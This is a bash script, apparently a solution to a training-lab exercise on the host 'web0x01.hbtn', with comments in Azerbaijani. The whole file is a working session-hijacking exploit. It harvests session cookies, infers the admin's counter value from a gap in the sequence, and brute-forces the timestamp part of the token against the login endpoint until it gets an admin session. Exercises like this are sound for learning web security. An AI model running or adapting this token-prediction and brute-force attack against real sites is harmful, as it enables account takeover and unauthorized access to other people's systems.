#!/bin/bash

URL="http://web0x01.hbtn"
PAGE="/a1/hijack_session/"
LOGIN="/api/a1/hijack_session/login"

echo "[*] Session-lar yığılır (real-time)..."

sessions=()

for i in {1..6}; do
  s=$(curl -s -D - "$URL$PAGE" \
    | grep -i "^Set-Cookie: hijack_session=" \
    | cut -d= -f2 \
    | cut -d\; -f1)

  echo "[$i] $s"
  sessions+=("$s")
  sleep 0.15
done

echo
echo "[*] GAP axtarılır..."

prev=0
ADMIN_COUNTER=""

for s in "${sessions[@]}"; do
  c=$(echo "$s" | cut -d- -f5)

  if [[ "$prev" -ne 0 && $((prev+1)) -ne "$c" ]]; then
    ADMIN_COUNTER=$((prev+1))
    echo "[+] GAP tapıldı → Admin counter: $ADMIN_COUNTER"
    break
  fi
  prev=$c
done

if [[ -z "$ADMIN_COUNTER" ]]; then
  echo "[-] GAP tapılmadı, yenidən işə sal"
  exit 1
fi

PREFIX=$(echo "${sessions[0]}" | cut -d- -f1-4)

TS1=$(echo "${sessions[-2]}" | cut -d- -f6)
TS2=$(echo "${sessions[-1]}" | cut -d- -f6)

START=$((TS1-50))
END=$((TS2+50))

echo "[*] Prefix   : $PREFIX"
echo "[*] Timestamp aralığı: $START → $END"
echo
echo "[*] Admin session brute edilir..."

for ts in $(seq $START $END); do
  COOKIE="$PREFIX-$ADMIN_COUNTER-$ts"

  res=$(curl -s -X POST \
    -b "hijack_session=$COOKIE" \
    "$URL$LOGIN")

  if [[ "$res" != *"failed"* ]]; then
    echo
    echo "[🎯 ADMIN TAPILDI]"
    echo "COOKIE = $COOKIE"
    echo "$res"
    exit 0
  fi
done

echo "[-] Flag tapılmadı (scripti yenidən işə sal)"
